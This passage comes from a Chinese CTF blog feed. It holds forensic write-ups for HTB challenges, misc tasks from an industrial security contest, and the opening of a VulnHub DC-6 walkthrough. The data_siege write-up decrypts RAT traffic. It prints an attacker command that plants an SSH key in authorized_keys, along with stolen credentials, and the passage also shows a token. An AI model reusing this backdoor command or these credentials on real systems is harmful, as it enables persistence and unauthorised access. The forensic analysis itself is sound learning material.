但是没有偏移值 好像只有这个网站可以做到</p><p><a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES解密</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151103552.png" alt="image-20240315110356503"></p><pre><code>ui(wyXØU(î6Nx[    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;,    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;]</code></pre><p>里面的 <code>Email</code> 部分再解base64就是flag2</p><pre><code>b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151106059.png" alt="image-20240315110637977"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><p>先看协议分级  主要是tcp协议</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122000172.png" alt="image-20240312200010100"></p><p>直接追踪tcp流  看到从第一个包开始 奇数包都传输了一个压缩包 密码直接在包中显示出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122002053.png" alt="image-20240312200230965"></p><p>一共有15个这样的压缩包  将字符串提取出来 先解base64 在另存为压缩包 使用相应的密码进行解压 观察第一个解压的文件 应该是一个pdf文件 分成了15个部分 最后将这15个文件全部进行拼接 得到完整的pdf文件 在末尾找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122042924.png" alt="image-20240312204207845"></p><h3 id="data-siege"><a href="#data-siege" class="headerlink" title="data_siege"></a>data_siege</h3><pre><code>&quot;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city&#39;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.&quot;</code></pre><p>题干告诉我们flag分为三部分 </p><p>附件是一个流量包  看了一眼协议分级  主要是TCP协议的流量包</p><p>看一下可以导出的HTTP对象 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141055864.png" alt="image-20240314105505835"></p><p>将这个<code>aQ4caZ.exe</code> 导出 直接放在010里面看 找到一部分字符串 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141056081.png" alt="image-20240314105640043"></p><pre><code>Very_S3cr3t_S</code></pre><p>开始以为这是一部分flag  后来发现这个不是 是AES加密密钥的盐值</p><p>追踪tcp流 在第五个包发现好像是base64的字符串 解一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141102380.png" alt="image-20240314110226319"></p><p>看到flag part3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141103418.png" alt="image-20240314110335330"></p><p>但是数据很乱  应该是前面有混淆字符 整理一下 重新解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141105217.png" alt="image-20240314110525109"></p><pre><code>0r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><p>到这一步 第五个包剩下的部分应该还是要进行解密 猜测是AES解密 但是解密密钥偏移值等信息 就是要分析上面提取出来的exe程序 进行逆向  这边要使用dnspy进行调试分析 </p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnspy下载安装</a></p><p>直接使用dnspy将<code>aQ4caZ.exe</code>打开 可以看到这个程序原本的名字是<code>EZRATClient</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161648741.png" alt="image-20240316164845657"></p><p>找到解密函数 </p><pre><code class="c#">public static string Decrypt(string cipherText)&#123;    string result;    try    &#123;        string encryptKey = Constantes.EncryptKey;        byte[] array = Convert.FromBase64String(cipherText);        using (Aes aes = Aes.Create())        &#123;            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]            &#123;                86,                101,                114,                121,                95,                83,                51,                99,                114,                51,                116,                95,                83            &#125;);            aes.Key = rfc2898DeriveBytes.GetBytes(32);            aes.IV = rfc2898DeriveBytes.GetBytes(16);            using (MemoryStream memoryStream = new MemoryStream())            &#123;                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                &#123;                    cryptoStream.Write(array, 0, array.Length);                    cryptoStream.Close();                &#125;                cipherText = Encoding.Default.GetString(memoryStream.ToArray());            &#125;        &#125;        result = cipherText;    &#125;    catch (Exception ex)    &#123;        Console.WriteLine(ex.Message);        Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);        result = &quot;error&quot;;    &#125;    return result;&#125;</code></pre><p>里面提到的这个<code>encryptKey</code>  可以在下面找到<code>EZRATClient.Core--Constantes--_encryptKey</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161703743.png" alt="image-20240316170317697"></p><pre><code>VYAemVeO3zUDTL6N62kVA</code></pre><p>那解密函数在程序里面已经给了 需要用到的密钥也给了 只是这段解密代码缺少一部分对密文的输出和对解密 补上就可以</p><pre><code class="c#">using System;using System.IO;using System.Security.Cryptography;using System.Text;public static class Program&#123;    public static void Main(string[] args)    &#123;        // 测试解密方法        string cipherText = &quot;ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=&quot;; // 你的密文        string decryptedText = Decrypt(cipherText);        Console.WriteLine(&quot;Decrypted Text: &quot; + decryptedText);    &#125;    public static string Decrypt(string cipherText)    &#123;        string result;        try        &#123;            string key = &quot;VYAemVeO3zUDTL6N62kVA&quot;; // 添加密钥            byte[] array = Convert.FromBase64String(cipherText);            using (Aes aes = Aes.Create())            &#123;                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, new byte[]                &#123;                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83                &#125;);                aes.Key = rfc2898DeriveBytes.GetBytes(32);                aes.IV = rfc2898DeriveBytes.GetBytes(16);                using (MemoryStream memoryStream = new MemoryStream())                &#123;                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                    &#123;                        cryptoStream.Write(array, 0, array.Length);                    &#125;                    byte[] decryptedBytes = memoryStream.ToArray();                    result = Encoding.UTF8.GetString(decryptedBytes); // 使用UTF-8编码解码明文                &#125;            &#125;        &#125;        catch (Exception ex)        &#123;            Console.WriteLine(ex.Message);            Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);            result = &quot;error&quot;;        &#125;        return result;    &#125;&#125;// Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB&#123;c0mmun1c4710n5 &gt;&gt; C:\Users\svc01\.ssh\authorized_keys</code></pre><p>出来了flag1  后面继续对tcp流5中的内容进行解密 得到flag2</p><pre><code class="c#">zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg// Decrypted Text: cmd;C:\;Username: svc01 Password: Passw0rdCorp5421 2nd flag part: _h45_b33n_r357</code></pre><p>完整flag</p><pre><code>HTB&#123;c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><h3 id="Pursue-The-Tracks"><a href="#Pursue-The-Tracks" class="headerlink" title="Pursue The Tracks"></a>Pursue The Tracks</h3><pre><code>Luxx, leader of The Phreaks, immerses himself in the depths of his computer, tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation. With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. To get the flag, you need to answer the questions from the docker instance.</code></pre><p>题目告诉我们 如果想要拿到flag  需要回答docker容器里面的问题 </p><p>给到的附件是一个MFT文件 是NTFS文件系统的备份文件 </p><pre><code>MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。</code></pre><p>为了更直接的读取MFT文件中的信息 我们使用下面这个项目  可以将MFT中的信息进行解析  并将结果保存在csv表格文件中</p><p><a href="https://github.com/jschicht/Mft2Csv">Mft2Csv</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131723127.png" alt="image-20240313172337050"></p><p>打开第一个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724670.png" alt="image-20240313172408605"></p><p>使用nc 连接docker容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724852.png" alt="image-20240313172442588"></p><p>第一个问题</p><pre><code>Files are related to two years, which are those? (for example: 1993,1995)</code></pre><p>直接在表格里面看 看到两个文件夹 一个名为2023 一个名为2024 那就是这两个年份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131740311.png" alt="image-20240313174026188"></p><pre><code>2023,2024</code></pre><p>第二个问题</p><pre><code>There are some documents, which is the name of the first file written? (for example: randomname.pdf)</code></pre><p>问的是第一个写入的文件名是  这个直接在表格里面找到第一个出现的文件即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131741366.png" alt="image-20240313174159253"></p><pre><code>Final_Annual_Report.xlsx</code></pre><p>第三个问题</p><pre><code>Which file was deleted? (for example: randomname.pdf)</code></pre><p>问的是哪个文件被删除了 这个其实就是找不同 在表格列出的文件中 可以看到<code>Marketing_Plan.xlsx</code>这个文件 第六列的数字是2  但是其他文件都是1 找到对应列的属性 是<code>HEADER_SequenceNo</code>  我们大概可以理解为是一个状态码 2表示这个文件是删除状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131745378.png" alt="image-20240313174556256"></p><pre><code>Marketing_Plan.xlsx</code></pre><p>第四个问题</p><pre><code>How many of them have been set in Hidden mode? (for example: 43)</code></pre><p>问的是有多少个文件处在被隐藏状态 第15列的属性是<code>SI_FilePermission</code> 表示文件权限 找到<code>credentials.txt</code>  这个文件在第15列的值是<code>hidden</code> 表明这个文件此时是处在隐藏状态  在所有文件中 只有这一个文件在第15列的值是<code>hidden</code> 因此 只有1个文件处在隐藏状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131751419.png" alt="image-20240313175137292"></p><pre><code>1</code></pre><p>第五个问题</p><pre><code>Which is the filename of the important TXT file that was created? (for example: randomname.txt)</code></pre><p>问的是被创建的重要的txt文件格式的文件名是什么</p><p>只有一个txt文件类型的文件  就是上一题的<code>credentials.txt</code></p><pre><code>credentials.txt</code></pre><p>第六个问题</p><pre><code>A file was also copied, which is the new filename? (for example: randomname.pdf)</code></pre><p>问的是被复制的文件的文件名是什么  也是观察文件的属性 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132109266.png" alt="image-20240313210919189"></p><p>注意到这个值 其他文件都是0 那这个属性应该就是代表着被复制过的文件</p><pre><code>Financial_Statement_draft.xlsx</code></pre><p>第七个问题</p><pre><code>Which file was modified after creation? (for example: randomname.pdf)</code></pre><p>问的是哪个文件在创建后被修改 这个就是观察时间即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132114714.png" alt="image-20240313211413625"></p><p>只有<code>Project_Proposal.pdf</code>的时间发生了改变  那就是在第一次写入或者保存之后被修改了</p><pre><code>Project_Proposal.pdf</code></pre><p>第八个问题</p><pre><code>What is the name of the file located at record number 45? (for example: randomname.pdf)</code></pre><p>问的就是文件编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132115001.png" alt="image-20240313211553934"></p><pre><code>Annual_Report.xlsx</code></pre><p>第九个问题</p><pre><code>What is the size of the file located at record number 40? (for example: 1337)</code></pre><p>问的是编号40的文件的文件大小</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132116100.png" alt="image-20240313211641061"></p><pre><code>57344</code></pre><p>答完所有问题之后 成功拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132117686.png" alt="image-20240313211708636"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年中国工业互联网安全大赛决赛-misc</title>
      <link href="/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/"/>
      <url>/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年中国工业互联网安全大赛决赛-misc"><a href="#2023年中国工业互联网安全大赛决赛-misc" class="headerlink" title="2023年中国工业互联网安全大赛决赛-misc"></a>2023年中国工业互联网安全大赛决赛-misc</h1><pre><code>刷csdn看到了这个比赛 顺手下了附件也来做一做</code></pre><h2 id="DNS-Query-DNS流量提取数据-二维码"><a href="#DNS-Query-DNS流量提取数据-二维码" class="headerlink" title="DNS_Query(DNS流量提取数据 二维码)"></a>DNS_Query(DNS流量提取数据 二维码)</h2><p>拿到一个dns流量 看到info里面有东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011416656.png" alt="image-20240301141629512"></p><p>但是每两条里面的info都是一样的 那我们先过滤一下</p><pre><code>frame.len == 142</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011417055.png" alt="image-20240301141757969"></p><p>写tshark语句把里面的信息提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011418609.png" alt="image-20240301141844558"></p><pre><code>tshark -r DNS_Query.pcapng -T fields -Y &quot;frame.len == 142&quot; -e &quot;dns.qry.name&quot; | awk &#39;&#123;print substr($0,0,29)&#125;&#39; | tr -d &#39;\n&#39; &gt;data.txt</code></pre><pre><code>-Y 是筛选数据包-e 由上图可以看到我们想要提取的数据是在queries的name字段的awk 对提取出来的文本进行处理 提取从第一个字符开始的连续29个字符 这里我们只需要数字部分tr 进一步处理将每行后面的换行符去掉</code></pre><p>猜测这段字符是二维码 写脚本进行转化</p><pre><code class="python">from PIL import Imagefrom zlib import *MAX = 29pic = Image.new(&quot;RGB&quot;, (MAX, MAX))str1 = &quotquot;i = 0for y in range(0, MAX):    for x in range(0, MAX):        if str1[i] == &#39;1&#39;:            pic.putpixel([x, y], (0, 0, 0))        else:            pic.putpixel([x, y], (255, 255, 255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011422724.png" alt="image-20240301142248689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423480.png" alt="image-20240301142320432"></p><h2 id="gigached-lsb隐写-AES加解密"><a href="#gigached-lsb隐写-AES加解密" class="headerlink" title="gigached(lsb隐写 AES加解密)"></a>gigached(lsb隐写 AES加解密)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423883.png" alt="image-20240301142346826"></p><p>压缩包里面有注释 应该是一段加密逻辑 但是我拿到的附件是已经被解压的了 只能看wp里面的了</p><pre><code class="python">def encrypt(key, source):    source = source.encode()    key = key.encode()    key = SHA256.new(key).digest()    IV = Random.new().read(AES.block_size)     encryptor = AES.new(key, AES.MODE_CBC, IV)    padding = AES.block_size - len(source) % AES.block_size      source += bytes([padding]) * padding      data = IV + encryptor.encrypt(source)      return data</code></pre><p>给的这个文件 先看一下类型 是一个iso media</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011712296.png" alt="image-20240301171240260"></p><p>改个后缀名 使用ffmpeg或者foremost 进行分帧 题目介绍是lsb on movie 那视频文件没法进行lsb隐写 估计是在视频的某几帧里面进行lsb隐写</p><pre><code>foremost gigached     或者ffmpeg -i gigached ./output/outr%04d.png</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011941137.png" alt="image-20240301194149977"></p><p>直接使用stegsolve或者zsteg提取隐藏信息就可以了</p><pre><code>8:dp6UYHfO8:NZhyAEYx8:Js8o30248:l+je3k5k8:aJmsL+Hx8:w43oQ3oz8:XjTT3/LQ8:qF4fuu/w8:MNqZVqiA8:Q3vzixxY8:QYbnuQ==8: the key8: isgYpt38:GvM7X1A13:CoT</code></pre><p>将这个内容写入<code>1.txt</code> 写个脚本处理一下</p><pre><code class="python">with open(&quot;1.txt&quot;, &#39;r+&#39;) as f:    line = f.readlines()    new_lines = []    for i in line:        i = i[2:10:1]        new_lines.append(i)    f.writelines(new_lines)</code></pre><pre><code>dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ== the key isgYpt3GvM7X1A1CoT</code></pre><p>根据前面的加密方式写解密脚本</p><pre><code class="python">from Crypto.Cipher import AESfrom Crypto.Hash import SHA256from Crypto import Randomimport base64def decrypt(key, data):    data = base64.b64decode(data)    key = key.encode()    key = SHA256.new(key).digest()    IV = data[:AES.block_size]    decryptor = AES.new(key, AES.MODE_CBC, IV)    decrypted = decryptor.decrypt(data[AES.block_size:])    padding_length = decrypted[-1]    decrypted = decrypted[:-padding_length]    return decrypted.decode()encrypted_data = &quot;dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ==&quot;key = &quot;gYpt3GvM7X1A1CoT&quot;decrypted_text = decrypt(key, encrypted_data)print(decrypted_text)# flag&#123;d53dbf36-444a-471d-a663-91a9e6f400e0&#125;</code></pre><h2 id="hellofromspace-udp流量提取图片-图片异或"><a href="#hellofromspace-udp流量提取图片-图片异或" class="headerlink" title="hellofromspace(udp流量提取图片 图片异或)"></a>hellofromspace(udp流量提取图片 图片异或)</h2><p>打开流量包 看一下协议分级 基本上全是UDP 那就直接追踪一下UDP流 看到两部分flag 一个在<code>flag_part1.txt</code>中 一个在<code>flag_part2.png</code>中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021615238.png" alt="image-20240302161547156"></p><p>追踪udp流发现只有一个流 第一部分flag可以直接在里面搜出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021623120.png" alt="image-20240302162340041"></p><pre><code>flag&#123;c0ee07da-246d</code></pre><p>将数据形式改为原始数据 在010editor里面保存为新文件 <code>1.png</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021618493.png" alt="image-20240302161829428"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021629554.png" alt="image-20240302162905511"></p><p>看着有点不对劲  很明显是缺少了完整的图片结构 但是末尾也确实有正确的图片尾</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021631430.png" alt="image-20240302163127383"></p><p>猜测是中间的部分出了问题 返回去在看一下 图片头是出现在长度为1189的包中的 后面也有很多长度为1189的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021632497.png" alt="image-20240302163215440"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021633081.png" alt="image-20240302163316025"></p><p>png头是从第12个字节出现的 观察下一个长度为1189的包 看到第10个字节数字加了1 看来是计数的 使用的是16进制计数法 顺序计数 那就不用再单独排序了 考虑到文件尾是出现在长度为289的包 那我们就筛选长度&gt;&#x3D;289的包</p><pre><code>udp &amp;&amp; frame.len &gt;= 289</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021636814.png" alt="image-20240302163643722"></p><p>tshark提一下数据</p><pre><code>tshark -r hello.pcapng -T fields -Y &quot;udp &amp;&amp; frame.len &gt;= 289&quot; -e &quot;data.data&quot; | awk &#39;&#123;print substr($0,23)&#125;&#39; &gt; hex.txt </code></pre><p>再把数据放在010里面转储为png图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021701046.png" alt="image-20240302170117632"></p><p>看起来和题目附件里面的<code>original.png</code>一样 猜测是双图盲水印  但尝试过后发现不是 是两张图片异或 使用stegsolve就可以 先打开一张图片 再点Analyse–Image Combiner</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021706412.png" alt="image-20240302170653378"><br>得到一张图片 隐隐约约看到后半段flag </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021707241.png" alt="image-20240302170757151"></p><p>将其保存下来 找个看的清楚的通道</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021709425.png" alt="image-20240302170937373"></p><h2 id="threepages-苹果png解析bug-lsb隐写-js函数调用"><a href="#threepages-苹果png解析bug-lsb隐写-js函数调用" class="headerlink" title="threepages(苹果png解析bug lsb隐写 js函数调用)"></a>threepages(苹果png解析bug lsb隐写 js函数调用)</h2><p>拿到流量包 看一下http导出 关键的文件就是三个html文件<code>page1.html page2.html page3.html</code>  提取出来看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022123964.png" alt="image-20240302212349935"></p><p>得到key1</p><pre><code>f79accc3ae844981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022044688.png" alt="image-20240302204431462"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022124478.png" alt="image-20240302212413361"></p><p>扫码得到一段话</p><pre><code>Do you know some picture will be displayed differently on different devices?</code></pre><p>指的是在不同设备上显示不同的图片 搜了一下 是苹果png解析bug</p><p><a href="https://moonvy.com/blog/post/2021/%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%AE%BE%E5%A4%87%E4%B8%8A%E6%98%BE%E7%A4%BA%E4%B8%8D%E4%B8%80%E6%A0%B7%E5%86%85%E5%AE%B9%E7%9A%84%E7%A5%9E%E5%A5%87PNG%E5%9B%BE%E7%89%87/">在不同设备上显示不一样内容的神奇图片</a></p><p>找一个识别网站<a href="https://fotoforensics.com/">在线识别</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134056.png" alt="image-20240302213418896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134489.png" alt="image-20240302213429375"></p><p>找个在线网站读一下条形码  <a href="https://online-barcode-reader.inliteresearch.com/default.aspx">在线读条形码</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022137997.png" alt="image-20240302213748954"></p><pre><code>here is your key2: 818facca67289de2</code></pre><p>还提取出来一个<code>p2.png</code>  常规的png图片分析方法  看一下有没有lsb隐写 发现在alpha的全部通道均存在隐藏信息 </p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018849.png" alt="image-20240303201804803"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018879.png" alt="image-20240303201812836"></p><p>选择<code>save bin</code> 将信息提取出来 解base64得到源码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032019146.png" alt="image-20240303201911078"></p><p>我们查看page2.html的内容 发现影响返回值的结果的是<code>processDecrypt()</code>函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032024302.png" alt="image-20240303202438259"></p><p>源码里面有关于这个函数的内容</p><pre><code class="javascript">function processDecrypt()&#123;var r=document.getElementById(&quot;key1&quot;).value,e=document.getElementById(&quot;key2&quot;).value;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>那我们直接将我们得到的key1和key2赋予r和e两个参数即可</p><pre><code class="javascript">function processDecrypt()&#123;var r=&quot;f79accc3ae844981&quot;,e=&quot;818facca67289de2&quot;;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>直接将赋值后的代码替换掉源码里面的部分 替换后将源码的全部复制进控制台 在调用<code>processDecrypt()</code>函数即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032029143.png" alt="image-20240303202958990"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-6</title>
      <link href="/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/"/>
      <url>/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-6"><a href="#vulnhub靶场DC-6" class="headerlink" title="vulnhub靶场DC-6"></a>vulnhub靶场DC-6</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This isn&#39;t an overly difficult challenge so should be great for beginners.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171832816.png" alt="image-20240117183209736"></p><p>扫到ip为192.168.160.157 开放了22和80端口</p><p>在扫描靶机端口</p><pre><code>nmap -A -p- -v 